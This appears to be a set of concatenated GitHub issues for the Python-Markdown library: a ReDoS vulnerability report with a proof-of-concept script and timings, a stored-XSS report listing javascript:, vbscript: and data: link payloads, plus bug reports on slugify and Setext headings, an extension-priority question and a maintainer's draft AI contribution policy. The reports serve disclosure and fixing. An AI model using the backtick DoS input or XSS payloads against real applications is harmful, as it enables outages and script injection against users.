On a run of **unmatched** backticks the second alternative (a backtick-run capture, a lazy `.+?`, then the `\2` back-reference) back-tracks catastrophically — Python's `re` cannot use a DFA with a back-reference. Parse time grows ≈ **O(n³)**: ~1 KB → 2.7 s, ~1.5 KB → 9 s, ~2 KB → >12 s. `markdown.markdown()` is synchronous and CPU-bound, so one small unauthenticated request pins the worker → remote DoS for any app that renders untrusted Markdown.

## PoC

```bash
pip install "markdown==3.10.3"
python3 poc/markdown_backtick_redos_poc.py
```

```python
import re
import signal
import time
import markdown
from markdown.inlinepatterns import BACKTICK_RE

class _Timeout(Exception):
    pass

signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(_Timeout()))

def timed(fn, s, cap=12.0):
    signal.setitimer(signal.ITIMER_REAL, cap)
    t0 = time.perf_counter()
    try:
        fn(s)
        dt = time.perf_counter() - t0
        signal.setitimer(signal.ITIMER_REAL, 0)
        return dt, False
    except _Timeout:
        return cap, True

def main():
    print(f"Python-Markdown {markdown.__version__}")
    print(f"BACKTICK_RE = {BACKTICK_RE!r}\n")
    print(f"    {'n (=bytes)':>12} {'time':>10}   ratio(2x)")
    prev = None
    for n in [250, 500, 1000, 1500, 2000]:
        dt, to = timed(markdown.markdown, "`" * n)
        r = (dt / prev) if prev else 0.0
        print(f"    {n:>12} {('TIMEOUT>' + str(int(dt)) + 's') if to else f'{dt:8.3f}s':>10}   {r:5.2f}")
        prev = dt
        if to:
            break
    rx = re.compile(BACKTICK_RE)
    print(f"    {'n':>12} {'time':>10}   ratio(2x)")
    prev = None
    for n in [250, 500, 1000, 2000]:
        dt, to = timed(rx.search, "`" * n)
        r = (dt / prev) if prev else 0.0
        print(f"    {n:>12} {('TIMEOUT>' + str(int(dt)) + 's') if to else f'{dt:8.3f}s':>10}   {r:5.2f}")
        prev = dt
        if to:
            break
        
if __name__ == "__main__":
    main()
```

Output (Python-Markdown 3.10.3), input = a string of *n* backtick characters:

```
(1) markdown.markdown():       n=1000 → 2.7 s,  n=1500 → 9.2 s,  n=2000 → TIMEOUT>12s
(2) isolated re.search(BACKTICK_RE):  identical blow-up  (~8× per doubling ≈ cubic)
```

Part (2) shows the isolated regex reproduces the blow-up exactly — the regex itself is the cause.

## Threat Model

- **Attacker:** submits Markdown text that the app renders — the intended input of any Markdown feature (comments, posts, bios, wiki/doc pages, chat, PR/issue bodies, LLM output rendered as Markdown). Commonly unauthenticated; the payload (a run of backticks) is trivial and passes any "looks like text" check.
- **No precondition to disclaim:** rendering untrusted Markdown is the documented purpose.

## Impact

- Remote, unauthenticated CPU-exhaustion DoS: ~2 KB → ~12 s of single-core CPU; cubic growth means a few KB reaches minutes; concurrent requests saturate all workers → outage.
- Synchronous parsing blocks the worker / event-loop thread for the whole duration.
- Broad blast radius: Python-Markdown is one of the most widely deployed Markdown engines (MkDocs, many Django/Flask apps, static-site generators, documentation & CI pipelines, LLM/chat front-ends).

## Suggested fix

- Replace the regex with a **linear** CommonMark-style code-span scanner (as `markdown-it-py`, which is linear on these inputs): find an opening run of *k* backticks, then locate the next run of exactly *k* backticks with ordinary string operations — no backtracking, no back-reference.
- If a regex must be kept: drop the back-reference and the `.+?` between two variable-length backtick runs; bound the backtick-run length; and/or cap input size.
- Regression test: a 5000-backtick input must parse in well under a second.

## tl;dr ### Found [markdown.extensions.toc.slugify](https://github.com/Python-Markdown/markdown/blob/8453df010daf9547efcc20a05bb12c0e2fd2016a/markdown/extensions/toc.py#L38-L45) strips trailing `-` hyphen turning headings like `## Installation 📦` into slugs like `installation` ```py >>> markdown.extensions.toc.slugify('Installation 📦', separator='-', unicode=False) 'installation' ``` ### Expected `markdown.extensions.toc.slugify` keeps trailing `-` when fed with heading that ends with "space+non-ASCII" to match VS Code and GitHub behavior. ```py >>> markdown.extensions.toc.slugify('Installation 📦', separator='-', unicode=False) 'installation-' ``` ### Solution proposal * trim white space first * then "wordify" (remove non-ASCII) ```py def slugify(value: str, separator: str, unicode: bool = False) -> str: """ Slugify a string, to make it URL friendly. """ value = value.strip() if not unicode: # Replace Extended Latin characters with ASCII, i.e. `žlutý` => `zluty` value = unicodedata.normalize('NFKD', value) value = value.encode('ascii', 'ignore').decode('ascii') value = re.sub(r'[^\w\s-]', '', value).lower() return re.sub(r'[{}\s]+'.format(separator), separator, value) ``` ## context Hello! @squidfunk from Zensical was passing me here via [zensical#819](https://github.com/zensical/zensical/issues/819) So, I was looking at [the pydoc-markdown documentation](https://niklasrosenstein.github.io/pydoc-markdown/) and wanted to click through the __Table of Contents__ there noticing that the links don't work. Actually ONLY the links ending with a space and an emoji don't work and the ones without emojis work fine. [Over at GitHub](https://github.com/NiklasRosenstein/pydoc-markdown#pydoc-markdown-) the same markdown seems to work just fine with any kind of style. So I tried this out myself and it seems that this markdown ```md ### Installation 📦 ``` will result in this HTML code: ```html

Installation 📦¶

``` Where as GitHub renders it into this behemoth: ```html

Installation 📦

``` It seems to boil down to: * [this `slugify` function](https://github.com/Python-Markdown/markdown/blob/8453df010daf9547efcc20a05bb12c0e2fd2016a/markdown/extensions/toc.py#L38-L45) and * the general [`.strip()`](https://github.com/Python-Markdown/markdown/blob/8453df010daf9547efcc20a05bb12c0e2fd2016a/markdown/extensions/toc.py#L44) * **after** [strippin non-ASCII](https://github.com/Python-Markdown/markdown/blob/8453df010daf9547efcc20a05bb12c0e2fd2016a/markdown/extensions/toc.py#L43). In VS Code already the built-in markdown support makes it keeping the trailing hyphen keeping compatibility with GitHub Enabling the Zensical Studio extension though this turns into `#installation`. Of course :D (probably using `markdown.extension.toc.slugify`) Looking at npm we can find [this `github-slugger`](https://www.npmjs.com/package/github-slugger#usage) which is probably not official but it also strips first, then removes non-ASCII 👍

items.body:
I'm writing an extension for linkifying URLs like `http://example.com` so that users don't even need to know that they could use `<http://example.com>` instead. Matching URLs isn't too hard (it doesn't need to be perfect), but the challenge is not modifying URLs in cases like `[example](http://example.com)`. My understanding is that extension priority affects this, but the priority concept isn't really documented in the [API docs](https://python-markdown.github.io/extensions/api/).

The docs first say that

> You may register instances of your processors and patterns with an appropriate priority

but as a user it's hard for me to tell what would be an "appropriate priority" in my case. The examples then later use 175 as the priority without explaining why that number was chosen. Finally,  `Register.register` documents `priority` argument like

> An integer or float used to sort against all items.

which isn't very helpful.

Thinks I'd expect to find from the docs:
- Does a small number mean a higher or smaller priority? In other words, is a plugin with priority 1 run before a plugin with priority 1000?
- Are negative priorities allowed? How are they interpreted?
- If a content is processed with an extension with a higher priority, is it anymore processed with other extensions? Does this behavior vary between different kind of extensions? I'm mostly interested in inline processors.
- What are priorities of built-in extensions? Can they be considered to be stable?

---

Good news is that I was able to make my prototype work by using a low priority like 10. When I used 175 that the examples had, the plugin messed up the `[example](http://example.com)` syntax. Based on that my assumption is that a higher number means higher priority and that extensions with lower priority aren't run if a higher priority extension already matched something.

Below is my current prototype code in case someone is interested. I still need to test it more thoroughly and the somewhat hairy regex should probably get some comments.

```python
import xml.etree.ElementTree as ET

from markdown.inlinepatterns import InlineProcessor
from markdown.extensions import Extension


class LinkifyInlineProcessor(InlineProcessor):
    def handleMatch(self, match, data):
        url, tail = match.groups()
        el = ET.Element("a", href=url)
        el.text = url
        el.tail = tail
        return el, match.start(0), match.end(0)


class LinkifyExtension(Extension):
    def extendMarkdown(self, md):
        pattern = r"([a-z][\w+-.]*://\S+?)([)\]}\"'.,!?:;|]*(?=\s|$))"
        md.inlinePatterns.register(LinkifyInlineProcessor(pattern, md), 'linkify', 10)
```

We have received a few recent PRs which I suspect were AI generated. It is likely we will only continue to receive more. I am not opposed to AI in general, but I do have some thoughts about what I expect for this project. All of this hangs on the fact that I have limited time to devote to this project as a volunteer. The more that my valuable time is wasted, the more the project suffers. Therefore, in the interest of maintaining a high-quality project, I feel that we need to create an AI policy.

First, I would prefer for the documentation to not contain what readers would perceive as an "AI" voice. That said, AI can be a real asset to contributors for whom English is not their first language.  My inclination is to suggest that they put forth their best (human) effort, and I would be happy to spend some time helping them improve their English prose. I would not consider that to be a waste of my time. However, it would be a waste of my time to edit AI generated prose.

Second, I would generally prefer that contributors be able to fully understand the code they are submitting. If a contributor cannot fully explain what their code is doing, then it is a waste of my time to review it. Yes, there are some very skilled programmers who may be able to provide an AI model with a detailed spec and have it generated good code which they have competently reviewed. However, it seems that most open-source submissions which are AI generated are slop from inexperienced contributors who are not able to understand the code, let alone understand why it is slop. Reviewing that slop is a waste of my time.

Therefore, I am inclined to implement a policy that all contributions must be human generated. If a contributor wants to use AI to assist with debugging, that's fine, but the code, documentation, commit message, and comments must be human generated. That said, I would be open to exceptions for specific known developers who I trust so long as they are upfront about their AI use.

I think that if we do this, we not only need to document the policy, but include a PR template which includes a checkbox where the contributor must explicitly indicate that no AI was used to generate the included code, documentation, commit message, and comments. I have generally been opposed to templates because I find that they are often too restrictive as they cannot address every possible situation. However, most recent PRs seem to completely ignore our contributing guidelines. A simple set of checkboxes might be sufficient.

Thoughts?

### Description `Markdown().convert()` passes dangerous URL schemes (`javascript:`, `vbscript:`, `data:text/html`) directly into the `` attribute without sanitization. A user-supplied markdown link is rendered into raw HTML that, when clicked, executes attacker-controlled JavaScript in the victim's browser session. ### Reproduction (Python-Markdown 3.9, latest at time of writing) ```python import markdown md = markdown.Markdown() # Each of these passes through unsanitized: print(md.convert("[click](javascript:alert(1))")) #

click

print(md.convert("[click](jAvAsCrIpT:alert(1))")) # Mixed case — still passes print(md.convert("[click](javascript:alert(1))")) # HTML-entity-encoded colon — still passes print(md.convert("[click](javascript:alert(1))")) # Hex-entity-encoded colon — still passes print(md.convert("[click](vbscript:alert(1))")) # Legacy IE vbscript print(md.convert("[click](data:text/html,)")) # data: URI HTML injection ``` In each case the rendered HTML contains the dangerous scheme verbatim in `href`. The serializer at `serializers.py` escapes attribute special-chars (e.g. `<` → `<`) but does not validate the URL scheme. ### Property that fails ```python from hypothesis import given, strategies as st import markdown DANGEROUS_PREFIXES = ["javascript:", "vbscript:", "data:text/html,"] @given(st.sampled_from(DANGEROUS_PREFIXES), st.text("abc123 ", min_size=1, max_size=20)) def test_no_dangerous_href(prefix, suffix): url = prefix + suffix out = markdown.Markdown().convert(f"[x]({url})") # No href attribute should contain a dangerous scheme assert "javascript:" not in out.lower() assert "vbscript:" not in out.lower() assert 'href="data:' not in out.lower() ``` All cases fail. ### Threat model Applications that render user-supplied markdown into HTML and serve it without an additional HTML sanitizer (e.g. comments, wikis, README rendering, chat) are vulnerable to stored XSS via crafted markdown links. ### Acknowledged context I'm aware Python-Markdown has historically recommended pairing with a sanitizer such as `bleach`, but: 1. The docs do not currently warn that the default link processor produces stored-XSS-vulnerable output on its own. Many projects bundle Markdown without a separate sanitizer. 2. Most peer markdown libraries (`marked`, `markdown-it`, `commonmark.js`) reject or escape dangerous URL schemes by default. 3. CommonMark spec [§6.6](https://spec.commonmark.org/0.31.2/#links) says: "URLs that contain the dangerous protocols `javascript:`, `vbscript:`, `file:`, and `data:` should be reserved for special use … the safe option is to disallow such URLs", and many implementations follow this. ### Proposed fix Reject (or strip) hrefs whose scheme, after entity-decoding and lowercasing, starts with `javascript:`, `vbscript:`, `file:`, or `data:` (except `data:image/*`). Patch in `LinkInlineProcessor.getLink()` of `inlinepatterns.py` after URL extraction. ### Environment - Python-Markdown: 3.9 (latest) - Python: 3.12

items.body:
Python-Markdown wrongly recognizes following as H1 and H2 headings, respectively:

```markdown
Some text
=-=-=-=-=

Some text
-=-=-=-=-
```

This is because the [regex](https://github.com/Python-Markdown/markdown/blob/e7a0efb3a7c36d6b8005403122705662bc17c904/markdown/blockprocessors.py#L497) for detection of Setext-style headings handles runs of the `=` and `-` characters incorrectly. Below the improved version, which uses `(?:[=]+|[-]+)` group instead of `[=-]+`:

```python
RE = re.compile(r'^.*?\n(?:[=]+|[-]+)[ ]*(\n|$)', re.MULTILINE)
```
items.title: Incorrect parsing of Setext-style headings
